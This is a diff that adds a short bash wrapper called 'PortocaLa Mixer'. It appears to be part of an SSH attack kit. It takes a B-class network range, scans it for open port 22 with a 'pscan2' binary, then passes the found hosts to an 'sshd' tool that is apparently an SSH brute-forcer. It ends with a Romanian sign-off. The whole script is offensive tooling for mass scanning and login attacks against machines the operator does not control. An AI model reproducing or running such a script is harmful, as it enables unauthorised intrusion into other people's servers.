@@ -1,0 +1,37 @@
+#!/bin/bash
+#PortocaLa Mixer
+#PortocaLa
+
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+rm -rf scan.log
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+BLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+
+echo "${GRN} -> ${RES} ${DRED} PortocaLa Mixer ${DRED}${GRN} <- ${RES}"
+
+sleep 0.5
+././pscan2 $1 22
+sleep 0.5
+
+./sshd scan.log 1 3 5 1000 port 22
+
+echo "${DGRN} -> ${RES} ${DRED} Acesta este sfarsitul prietene... ${DRED}${DGRN} <- ${RES}"
+
+sleep 0.5
